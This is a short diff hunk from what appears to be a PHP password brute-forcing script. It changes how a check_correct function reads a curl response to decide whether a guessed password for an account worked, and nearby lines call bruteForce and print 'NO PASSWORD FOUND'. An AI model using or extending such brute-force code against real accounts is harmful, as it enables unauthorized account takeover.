@@ -53,8 +53,8 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Followers") {return false;}
-        else {return true;}
+	if($str == "Followers") {return true;}
+        else {return false;}
 }
 bruteForce($username, $Pass1);
 echo "NO PASSWORD FOUND"; 
